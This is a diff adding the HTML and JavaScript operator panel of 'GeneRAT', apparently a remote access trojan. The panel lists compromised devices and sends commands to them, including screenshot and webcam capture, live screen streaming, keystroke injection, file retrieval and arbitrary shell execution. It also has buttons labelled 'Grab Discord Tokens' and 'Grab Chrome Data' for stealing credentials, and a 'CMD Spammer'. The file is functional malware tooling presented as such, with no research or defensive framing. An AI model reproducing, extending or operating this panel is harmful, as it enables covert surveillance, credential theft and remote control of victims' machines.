@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>GeneRAT</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <!-- Add this to your HTML body -->
+<div class="live-stream-container" id="streamContainer" style="display: none;">
+  <div class="stream-header">
+      <h3>Live Screen Stream</h3>
+      <button onclick="toggleStream('stop')" class="stream-close">×</button>
+  </div>
+  <img id="live_screenshot" alt="Live Screenshot">
+</div>
+  <div class="container">
+    <h1>GeneRAT</h1>
+
+    <!-- Device Selection -->
+    <div class="selection-group">
+      <label for="device_select">Select Device:</label>
+      <select id="device_select">
+        <!-- Dynamically populated device list -->
+      </select>
+    </div>
+
+    <!-- Command Buttons -->
+    <div class="button-group">
+      <button onclick="toggleOptions('chat')">Chat</button>
+      <button onclick="toggleOptions('ip_info')">Get IP Info</button>
+      <button onclick="toggleOptions('dir_ls')">List Directory</button>
+      <button onclick="toggleOptions('move_mouse')">Move Mouse</button>
+      <button onclick="toggleOptions('screen_shot')">Take Screenshot</button>
+      <button onclick="toggleOptions('webcam_snap')">Capture Webcam</button>
+      <button onclick="toggleOptions('open_website')">Open Website</button>
+      <button onclick="toggleOptions('send_key_press')">Send Keystrokes</button>
+      <button onclick="toggleOptions('show_popup')">Show Popup</button>
+      <button onclick="toggleOptions('text_speaker')">Text-to-Speech</button>
+      <button onclick="toggleOptions('system_info')">Get System Info</button>
+      <button onclick="toggleOptions('get_file')">Get File</button>
+      <button onclick="toggleOptions('shell_exec')">Execute Shell Command</button>
+      <button onclick="toggleOptions('grab_discord_tokens')">Grab Discord Tokens</button>
+      <button onclick="toggleOptions('grab_chrome_data')">Grab Chrome Data</button>
+      <button onclick="toggleOptions('cmd_spammer')">CMD Spammer</button>
+      <button onclick="toggleStream('start')">Start Stream</button>
+      <button onclick="toggleStream('stop')">Stop Stream</button>
+    </div>
+
+    <!-- Command Forms -->
+    <div id="chat" class="options">
+      <h2>Chat</h2>
+      <form onsubmit="sendCommand(event, 'chat')">
+        <label for="chat_msg">Message:</label>
+        <input type="text" id="chat_msg" name="data" required>
+        <button type="submit">Send Chat</button>
+      </form>
+    </div>
+
+    <div id="cmd_spammer" class="options">
+      <h2>CMD Spammer</h2>
+      <button onclick="sendCommand(null, 'cmd_spammer_on')">Start CMD Spammer</button>
+      <button onclick="sendCommand(null, 'cmd_spammer_off')">Stop CMD Spammer</button>
+    </div>    
+
+    <div id="ip_info" class="options">
+      <h2>Get IP Info</h2>
+      <form onsubmit="sendCommand(event, 'ip_info')">
+        <button type="submit">Get IP Info</button>
+      </form>
+    </div>
+
+    <div id="dir_ls" class="options">
+      <h2>List Directory</h2>
+      <form onsubmit="sendCommand(event, 'dir_ls')">
+        <label for="dir_ls_path">Directory Path (optional):</label>
+        <input type="text" id="dir_ls_path" name="data">
+        <button type="submit">List Contents</button>
+      </form>
+    </div>
+
+    <div id="move_mouse" class="options">
+      <h2>Move Mouse</h2>
+      <form onsubmit="sendCommand(event, 'move_mouse')">
+        <button type="submit">Move Mouse</button>
+      </form>
+    </div>
+
+    <div id="screen_shot" class="options">
+      <h2>Take Screenshot</h2>
+      <form onsubmit="sendCommand(event, 'screen_shot')">
+        <button type="submit">Take Screenshot</button>
+      </form>
+    </div>
+
+    <div id="webcam_snap" class="options">
+      <h2>Capture Webcam</h2>
+      <form onsubmit="sendCommand(event, 'webcam_snap')">
+        <button type="submit">Capture Webcam</button>
+      </form>
+    </div>
+
+    <div id="open_website" class="options">
+      <h2>Open Website</h2>
+      <form onsubmit="sendCommand(event, 'open_website')">
+        <label for="website_url">Website URL:</label>
+        <input type="text" id="website_url" name="data" placeholder="https://example.com" required>
+        <button type="submit">Open Website</button>
+      </form>
+    </div>
+
+    <div id="send_key_press" class="options">
+      <h2>Send Keystrokes</h2>
+      <form onsubmit="sendCommand(event, 'send_key_press')">
+        <label for="key_strokes">Keystrokes:</label>
+        <input type="text" id="key_strokes" name="data" required>
+        <button type="submit">Send Keystrokes</button>
+      </form>
+    </div>
+
+    <div id="show_popup" class="options">
+      <h2>Show Popup</h2>
+      <form onsubmit="sendCommand(event, 'show_popup')">
+        <label for="popup_msg">Popup Message:</label>
+        <input type="text" id="popup_msg" name="data" required>
+        <button type="submit">Show Popup</button>
+      </form>
+    </div>
+
+    <div id="text_speaker" class="options">
+      <h2>Text-to-Speech</h2>
+      <form onsubmit="sendCommand(event, 'text_speaker')">
+        <label for="speak_text">Text to Speak:</label>
+        <input type="text" id="speak_text" name="data" required>
+        <button type="submit">Speak Text</button>
+      </form>
+    </div>
+
+    <div id="system_info" class="options">
+      <h2>Get System Info</h2>
+      <form onsubmit="sendCommand(event, 'system_info')">
+        <button type="submit">Get System Info</button>
+      </form>
+    </div>
+
+    <div id="get_file" class="options">
+      <h2>Get File</h2>
+      <form onsubmit="sendCommand(event, 'get_file')">
+        <label for="file_path">File Path:</label>
+        <input type="text" id="file_path" name="data" placeholder="Enter the file path" required>
+        <button type="submit">Get File</button>
+      </form>
+    </div>
+
+    <div id="shell_exec" class="options">
+      <h2>Execute Shell Command</h2>
+      <form onsubmit="sendCommand(event, 'shell_exec')">
+        <label for="shell_command">Command to Execute:</label>
+        <input type="text" id="shell_command" name="data" required>
+        <button type="submit">Execute</button>
+      </form>
+    </div>
+
+    <div id="grab_discord_tokens" class="options">
+      <h2>Grab Discord Tokens</h2>
+      <form onsubmit="sendCommand(event, 'grab_discord_tokens')">
+        <button type="submit">Grab Tokens</button>
+      </form>
+    </div>
+
+    <!-- NEW FORM for Grab Chrome Data -->
+    <div id="grab_chrome_data" class="options">
+      <h2>Grab Chrome Data</h2>
+      <form onsubmit="sendCommand(event, 'grab_chrome_data')">
+        <button type="submit">Grab Data</button>
+      </form>
+    </div>
+    <!-- --------------------------------- -->
+
+    <!-- Execution Status -->
+    <div class="status" id="status">
+      <h3>Execution Status</h3>
+      <p id="status_message">No command executed yet.</p>
+    </div>
+
+    <!-- Local Response -->
+    <div class="response" id="response">
+      <h3>Local PC Response</h3>
+      <p id="response_message">No response yet.</p>
+      <img id="response_image" style="display:none;" />
+      <div id="file_download" style="margin-top: 10px; display: none;">
+        <h4>Downloaded File:</h4>
+        <a id="file_link" href="#" download>Download File</a>
+      </div>
+    </div>
+
+    <!-- <div class="live-stream">
+      <h3>Live Screen Stream</h3>
+      <img id="live_screenshot" alt="Live Screenshot" width="100%">
+    </div>
+  </div> -->
+
+
+<!-- Add Socket.IO client -->
+<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+<script>
+  // Initialize WebSocket connection
+  const socket = io();
+  const liveScreenshot = document.getElementById('live_screenshot');
+
+  // Handle screen updates
+  socket.on('update_image', (data) => {
+    liveScreenshot.src = 'data:image/jpeg;base64,' + data;
+  });
+
+  // NEW STREAM CONTROL FUNCTION
+  function toggleStream(action) {
+    const streamContainer = document.getElementById('streamContainer');
+    const deviceId = document.getElementById('device_select').value;
+    
+    if (!deviceId) {
+        alert('Please select a device first');
+        return;
+    }
+    
+    if (action === 'start') {
+        streamContainer.style.display = 'block';
+        sendCommand(null, 'start_stream');
+    } else {
+        streamContainer.style.display = 'none';
+        sendCommand(null, 'stop_stream');
+    }
+}
+
+  // Toggle show/hide for each command form
+  function toggleOptions(id) {
+    const section = document.getElementById(id);
+    
+    // Close all other sections
+    document.querySelectorAll('.options.active').forEach(opt => {
+      if (opt !== section) {
+        opt.classList.remove('active');
+      }
+    });
+    
+    // Toggle the current one
+    section.classList.toggle('active');
+    
+    // If using smooth scroll, optionally scroll the selected section into view
+    if (section.classList.contains('active')) {
+      section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+  }
+
+    async function fetchDevices() {
+      try {
+        const response = await fetch('/devices');
+        const data = await response.json();
+        const deviceSelect = document.getElementById('device_select');
+        deviceSelect.innerHTML = '';
+
+        for (const [id, info] of Object.entries(data.devices)) {
+          const option = document.createElement('option');
+          option.value = id;
+          option.textContent = `${info.name} (${id})`;
+          deviceSelect.appendChild(option);
+        }
+      } catch (error) {
+        console.error('Error fetching devices:', error);
+      }
+    }
+
+    async function sendCommand(event, command) {
+    if (event) event.preventDefault(); // Prevent form submission (only for forms)
+
+    const deviceId = document.getElementById('device_select').value;
+    if (!deviceId) {
+        alert('❌ Please select a device.');
+        return;
+    }
+
+    let data = "";
+    
+    // If the event is from a form, extract form data
+    if (event && event.target && event.target.tagName === "FORM") {
+        const formData = new FormData(event.target);
+        data = formData.get('data') || "";
+    }
+
+    console.log(`📡 Sending command: ${command} to device: ${deviceId} with data: ${data}`); // Debugging
+
+    try {
+        const response = await fetch('/send_command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device_id: deviceId, command, data })
+        });
+
+        console.log("Response status:", response.status); // Debugging
+        if (response.ok) {
+            document.getElementById('status_message').innerText = 
+              `✅ Command '${command}' sent successfully.`;
+        } else {
+            document.getElementById('status_message').innerText = 
+              `❌ Failed to send command '${command}'.`;
+        }
+
+    } catch (error) {
+        console.error("❌ Error sending command:", error);
+        document.getElementById('status_message').innerText = 
+          `❌ Error sending command '${command}': ${error}`;
+    }
+}
+
+
+    // Periodically fetch status and response
+    async function fetchStatusAndResponse() {
+      try {
+        const deviceId = document.getElementById('device_select').value;
+        if (!deviceId) return;
+
+        const statusResponse = await fetch('/status');
+        const status = await statusResponse.json();
+        document.getElementById('status_message').innerText = 
+          JSON.stringify(status.status, null, 2);
+
+        const responseResponse = await fetch('/response/' + deviceId);
+        const response = await responseResponse.json();
+        document.getElementById('response_message').innerText = 
+          response.message || '';
+
+        const imgElement = document.getElementById('response_image');
+        if (response.image_path) {
+          imgElement.src = response.image_path;
+          imgElement.style.display = 'block';
+        } else {
+          imgElement.style.display = 'none';
+        }
+
+        const fileDownloadElement = document.getElementById('file_download');
+        const fileLinkElement = document.getElementById('file_link');
+        if (response.file_path) {
+          fileLinkElement.href = response.file_path;
+          fileDownloadElement.style.display = 'block';
+        } else {
+          fileDownloadElement.style.display = 'none';
+        }
+      } catch (error) {
+        console.error('Error fetching status or response:', error);
+      }
+    }
+
+    // Initialize
+    fetchDevices();
+    setInterval(fetchStatusAndResponse, 2000);
+  </script>
+</body>
+</html>
